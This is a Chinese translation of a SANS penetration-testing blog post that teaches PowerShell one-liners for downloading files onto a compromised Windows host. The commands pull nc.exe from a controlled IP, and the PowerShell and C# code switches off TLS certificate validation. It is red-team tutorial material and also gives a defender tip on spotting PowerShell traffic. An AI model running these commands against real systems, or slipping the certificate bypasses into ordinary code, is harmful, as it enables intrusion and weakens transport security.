> 原文链接: https://www.anquanke.com//post/id/86302 


# 【技术分享】手把手教你使用PowerShell实现一句话Web客户端


                                阅读量   
                                **162116**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：pen-testing.sans.org
                                <br>原文地址：[https://pen-testing.sans.org/blog/2017/03/08/pen-test-poster-white-board-powershell-one-line-web-client](https://pen-testing.sans.org/blog/2017/03/08/pen-test-poster-white-board-powershell-one-line-web-client)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t012c63a0bf547694f4.png)](https://p4.ssl.qhimg.com/t012c63a0bf547694f4.png)

****

译者：[h4d35](http://bobao.360.cn/member/contribute?uid=1630860495)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**引言**

机动性对于一次入侵来说至关重要。当你将攻击策略和工具传送到远程环境中时，是否能够保持工具的可用性是资深专家和菜鸟小白的主要区别。关键点在于要解决在渗透测试中往往都会遇到的一个简单但普遍存在的问题：如何将文件从你的本机发送到你“拿下”的目标主机中。这是一个持续性的工作。无论目标环境如何配置、做了哪些安全控制，如果你都有一套上传文件的奇淫巧技，那你就能够将精力集中在具体的渗透工作中，“脚本小子”们就只能跟在你屁股后面吃灰了！

[![](https://p5.ssl.qhimg.com/t01df20cc5fc64ec884.png)](https://p5.ssl.qhimg.com/t01df20cc5fc64ec884.png)

我们都在文件传输这一关碰过壁。有一次，我忘记打开FTP中的二进制传输模式，导致我上传的可执行文件就是跑不起来，始终想不通为什么。结果呢？我一直在这个小问题上打转转（如果二进制传输模式未开启，文件就会损坏）。

精通多种文件传输方法是每个渗透测试工程师都应该会的相当有用的技能之一。事实证明，这一点对于“红队”来说确实如此。在红蓝对抗中，任何的数据传输可能就是红队是否能够保持访问权限、入侵蓝队网络甚至拿下域控权限的关键。在最近的一次对抗中，我们通过与远程桌面建立隧道连接获得了GUI访问权限，但是为了将工具无损地上传到目标环境，我们可谓是绞尽脑汁。最终我们解决了这个问题（此处应该有掌声）……通过IE浏览器把工具下载下来了。成功了！好吧，虽说这里用IE浏览器确实解决了我们的问题，但是本文将要讨论一种更有效、更强大的方案：**PowerShell**。

[![](https://p2.ssl.qhimg.com/t01eb892eb29d8701bb.png)](https://p2.ssl.qhimg.com/t01eb892eb29d8701bb.png)

*Windows用户总算可以使用wget了！（几乎算是wget吧？严格意义上讲，PowerShell中的wget只是Invoke-WebRequest命令的别名，但是也很接近啦。）*



**本文中用到的PowerShell命令**

**Win 7 PowerShell WebClient：**

****

```
`(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.10/nc.exe","nc.exe")`
```

**Win 8及更高版本PowerShell Invoke-WebRequest (wget)：<br>**



```
`wget "http://10.0.0.10/nc.exe" -outfile "nc.exe"`
```

**显示PowerShell版本信息：**

```
`Get-Host`
  `$PSVersionTable.PSVersion`
```

**ServicePointManager $true：<br>**



```
`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = `{`$true`}``
```

**Disable-NetSSLValidation<br>**

Invoke-SelfSignedWebRequest ([第三方工具](https://github.com/0sm0s1z/Invoke-SelfSignedWebRequest))：

```
`Invoke-SelfSignedWebRequest https://www.my.af.mil/ "-outfile index.htm"`
  `wget-ss https://spectruminfosec.com/index.php`
```

由于早期Windows系统中没有直接的文件传输工具，向Windows环境中导入文件一直以来都是一个比较困难的任务。Windows没有自带**netcat**、**wget**、**curl**、**ssh**或者**python**。但是有了PowerShell，这一切都不在话下了。是的，甚至都有**wget**了。

有一件重要的事情需要注意，那就是如今活跃的不同版本的PowerShell之间有很大的差别。一些古老的语言如Perl、Bash甚至Python，大部分的代码库一直保持相当一致。PowerShell自出现以来，经历了Windows操作系统的每次迭代的宏观演进。稍后还会提到这一点。

现在我们将从一个适用于所有版本的PowerShell的Web客户端开始。

**PowerShell WebClient**

```
`(New-Object System.Net.WebClient).DownloadFile("http://10.0.0.10/nc.exe","nc.exe")`
```

[![](https://p4.ssl.qhimg.com/t01d7b72c4e573c3b87.png)](https://p4.ssl.qhimg.com/t01d7b72c4e573c3b87.png)

因为上述命令在任意版本的Powershell中都可用，所以当你编写跨平台的脚本时，这是最佳的选择。



**命令分解**

1. `(New-Object System.Net.WebClient)` – 创建WebClient类的实例。WebClient对象就像其他图形界面的Web客户端一样，具有所有相关的功能

2. `DownloadFile("` – 调用WebClient类的DownloadFile方法。该方法允许WebClient从远程服务器下载文件

3. `http://10.0.0.10` – 通过HTTP协议从IP地址为10.0.0.10的主机下载文件

4. `/nc.exe"` – 下载nc.exe文件

5. `,"nc.exe")` – 下载的文件保存为nc.exe

**PowerShell Invoke-WebRequest**



```
`wget "http://10.0.0.10/nc.exe" -outfile "nc.exe"`
```

[![](https://p4.ssl.qhimg.com/t011f824326ca0e78e3.png)](https://p4.ssl.qhimg.com/t011f824326ca0e78e3.png)

在较新版本的PowerShell中，可以使用[Invoke-WebRequest](https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest)命令。此外，该命令还有一个别名**wget**，使用方法和Unix系统中的**wget**基本一样。



**命令分解**

1. `wget` – web get的简称。使用wget可以通过HTTP、HTTPS和FTP协议下载文件

2. `"10.0.0.10` – 通过HTTP协议从IP地址为10.0.0.10的主机下载文件

3. `/nc.exe"` – 下载nc.exe文件

4. `-outfile "nc.exe"` – 下载的文件保存为nc.exe

Windows PowerShell从3.0版本开始引入了[Invoke-WebRequest](https://msdn.microsoft.com/powershell/reference/5.1/microsoft.powershell.utility/Invoke-WebRequest)命令。运行`Get-Host`命令或者`$PSVersionTable.PSVersion`命令可以确定当前环境中的PowerShell版本。后者显示的版本号更精确，但是通常情况下，这两条命令显示的信息都够用了。

**显示PowerShell版本**

`Get-Host`或者`$PSVersionTable.PSVersion`

Windows 7 – PS 2.0**结果如下图所示：

[![](https://p1.ssl.qhimg.com/t01959e0372adac7ba9.png)](https://p1.ssl.qhimg.com/t01959e0372adac7ba9.png)

Windows 10 – PS 5.1**结果如下图所示：

[![](https://p3.ssl.qhimg.com/t018836ea72259e9a60.png)](https://p3.ssl.qhimg.com/t018836ea72259e9a60.png)

从2009年10月发布的Windows 7和Windows Server 2008 R2系统开始，PowerShell作为Windows系统预装组件随系统一起发布。不幸的是，Windows 7预装的PowerShell是2.0版本的，而许多功能强大的命令如**Invoke-WebRequest** (**wget**)一直到3.0版本的PowerShell才被引入。2012年8月，随着Windows 8和Windows Server 2012的发布，PowerShell 3.0成为标准操作系统构建的一部分。在撰写本文时，现代Windows 10操作系统默认预装了5.0版本的PowerShell。

大多数情况下，使用PowerShell进行渗透测试时，版本之间的主要区别在于2.0版本和3.0以上的版本。在2.0版本中，许多命令行需要直接通过.Net构造函数去实例化对象，如第一个示例中Windows 7版的WebClient中通过**New-Object**的方式一样。在3.0以上的版本中，许多功能已被创建并集成为独立的命令，使用起来更加直观明了。

<br>

**结论**

几乎所有的网络环境中都存在大量的Web流量。通过HTTP协议下载文件是一种很好的实现流量迁移而不被察觉的方式。寻找怪异的HTTP流量就像大海捞针。即便如此，考虑这样一种情形：对于防御者来说，通过检查User-Agent头识别可疑的HTTP流量效果惊人。

[![](https://p4.ssl.qhimg.com/t0164fc995dcd2a39d1.png)](https://p4.ssl.qhimg.com/t0164fc995dcd2a39d1.png)

尽管流量本身不是那么显眼（除了那些比较特殊的文件名外），“WindowsPowerShell/5.1?”这样的UserAgent确实还是挺显眼的，除非用户经常通过Windows PowerShell下载文件。

有时候，通过对流量中的敏感字眼进行过滤，筛选出那些不匹配的流量，防御者很容易就能取得成效。Seth Misenar和Chris Crowley通过SANS RaD-X (Rapid Experience Builder) 课程，定期向美国国防部（Department of Defense of the United States，DoD）成员（包括本文作者）教授这种防御策略。如果你是我的DoD兄弟们中的一员，我不能不推荐你参加RaD-X课程。

**<br>**

**额外奖励：PowerShell中使用HTTPS**



通过对蓝队一方的网络流量进行深入调查，红队如何提高技术手段以实现入侵呢？能想到的一个方案是加密。SSL/TLS是一种典型的现代Web流量。不幸的是，当上述技术遇到自签名或者无效签名的证书时，我们一般很难得到想要的结果：

[![](https://p4.ssl.qhimg.com/t01d9e5ada69c639496.png)](https://p4.ssl.qhimg.com/t01d9e5ada69c639496.png)

**错误提示**

WebClient.DownloadFile():

```
`Exception calling "DownloadFile" with "2" argument(s): "The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel."`
```

Invoke-WebRequest:

```
`The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel.`
```

当出现`CERT_AUTHORITY_INVALID`错误时，PowerShell会自动“保护”你。作为渗透人员来说，这是有问题的，因为我们很可能经常需要同那些没有正式签名证书的域或者网站打交道。绕过这些限制可能时灵时不时，取决于你所处的环境，但是综合使用接下来介绍的一些技巧通常可以解决问题。

对于WebClient来说，这种绕过通常很简单：

ServicePointManager $true:

```
`[System.Net.ServicePointManager]::ServerCertificateValidationCallback = `{`$true`}``
```

通过手动配置`ServerCertificateValidationCallback`使其返回$true，禁用通过`System.Net.ServicePointManager`端点的SSL证书校验，进而允许我们使用**WebClient.DownloadFile()**连接至具有自签名证书的域。

不幸的是，`ServerCertificateValidationCallback`不适用于异步回调函数。像*Invoke-WebRequest*和*Invoke-RestMethod*之类的回调函数在它们自己的线程内执行，以便给其他线程提供适当的运行空间，从而同时执行线程。因此，在配置了`ServerCertificateValidationCallback`之后，我们会遇到一个新的不同的错误：

```
`The underlying connection was closed: An unexpected error occurred on a send.`
```

解决这个问题难度有点困难，通常情况下有两种方案：

1. 手动安装证书

2. 在底层的.Net中禁用证书校验

作为安全专家，我们当然选择方案2！

Disable-NetSSLValidation：



```
```powershell
Add-Type @"
    using System;
    using System.Net;
    using System.Net.Security;
    using System.Security.Cryptography.X509Certificates;
    public class ServerCertificateValidationCallback
    `{`
        public static void Ignore()
        `{`
            ServicePointManager.ServerCertificateValidationCallback +=
                delegate
                (
                    Object obj,
                    X509Certificate certificate,
                    X509Chain chain,
                    SslPolicyErrors errors
                )
                `{`
                    return true;
                `}`;
        `}`
    `}`
"@
[ServerCertificateValidationCallback]::Ignore();
```
```

代码下载：Disable-NetSSLValidation.PDF

[https://blogs.sans.org/pen-testing/files/2017/03/Disable-NetSSLValidation.pdf](https://blogs.sans.org/pen-testing/files/2017/03/Disable-NetSSLValidation.pdf))

上述代码片断对内部的.NET做了相关配置，通过**useUnsafeHeaderParsing**禁用了SSL证书校验。不幸的是，尽管上述代码在某些情况下确实可用，但通常是无效的。见鬼！

鉴于我们现在被迫必须采取一些更加安全的手段，可以考虑以下代码：

Invoke-SelfSignedWebRequest：



```
```powershell
function Invoke-SelfSignedWebRequest
`{`
&lt;#
.SYNOPSIS
    Performs web requests without certificate validation
.DESCRIPTION
    Loads the target URI's SSL certificate into the local certificate store and wraps Invoke-WebRequest. Removes certificate upon completion of insecure WebRequest invocation. Aliased to wget-ss
 
    Author: Matthew Toussain (@0sm0s1z)
    License: BSD 3-Clause
.EXAMPLE
Invoke-SelfSignedWebRequest https://spectruminfosec.com/nc.exe "-outfile nc.exe"
wget-ss https://spectruminfosec.com/index.php
.LINK
    https://github.com/0sm0s1z/Invoke-SelfSignedWebRequest
#&gt;
[CmdletBinding()]
    param(
        [uri][string]$url,
[string]$cmdstr
    )
Set-StrictMode -Version 3
if($url.Scheme -ne "https") `{`
#Direct to WebRequest
$newWebRequest = "Invoke-WebRequest $url $cmdstr"
IEX $newWebRequest
`}` else `{`
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = `{`$true`}`
#Grab target SSL Certificate
$webRequest = [System.Net.HttpWebRequest]::Create($url)
try `{` $webRequest.GetResponse().Dispose() `}` catch `{``}`
$cert = $webRequest.ServicePoint.Certificate
$bytes = $cert.Export([Security.Cryptography.X509Certificates.X509ContentType]::Cert)
$fname = $url.host
$savePath = "$pwd$fname.key"
set-content -value $bytes -encoding byte -path $savePath
#Save to disk
$importCert = new-object System.Security.Cryptography.X509Certificates.X509Certificate2
$importCert.import($savePath)
#Load into local CurrentUser Store
$store = Get-Item "cert:CurrentUserMy"
$store.open("MaxAllowed")
$store.add($importCert)
$store.close()
#Wrap Invoke-WebRequest
$newWebRequest = "Invoke-WebRequest $url $cmdstr"
IEX $newWebRequest
#Remove Cert &amp; Clear Validation Callback
Get-ChildItem -Path "cert:CurrentUserMy" -DnsName $fname | Remove-Item -force -confirm:0
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = $null
`}`
`}`
New-Alias wget-ss Invoke-SelfSignedWebRequest
```
```

代码下载：Invoke-SelfSignedWebRequest.PDF：

[https://blogs.sans.org/pen-testing/files/2017/03/Invoke-SelfSignedWebRequest_00.pdf](https://blogs.sans.org/pen-testing/files/2017/03/Invoke-SelfSignedWebRequest_00.pdf)

Invoke-SelfSignedWebRequest**命令是对**Invoke-WebRequest**命令的一个封装，使用该命令可以连接到目标主机，然后下载X.509证书并将其加载进当前用户的证书存储区。

[![](https://p3.ssl.qhimg.com/t01eb561cb791b83bd6.png)](https://p3.ssl.qhimg.com/t01eb561cb791b83bd6.png)

接下来，它将Web请求传递给**Invoke-WebRequest**，从证书存储区中删除证书并重置**ServerCertificateValidationCallback**函数以便使系统恢复原状。所有的活都帮你干了，这感觉是不是很好？！

无效SSL证书绕过技巧和方法中所用到的代码已上传至Github，这些只是**SelfSignedWebRequest**代码库中的一部分：[https://github.com/0sm0s1z/Invoke-SelfSignedWebRequest](https://github.com/0sm0s1z/Invoke-SelfSignedWebRequest)

也许你已经发现`Disable-SSLValidation`命令也很有用。它利用反射机制实现了`System.Net.ICertificatePolicy`类，以禁用SSL证书校验。不过这条命令年代比较久远了，至于你能用来做什么就因人而异了。

[![](https://p5.ssl.qhimg.com/t01030d5dbff9e65be5.png)](https://p5.ssl.qhimg.com/t01030d5dbff9e65be5.png)

祝你玩的开心！


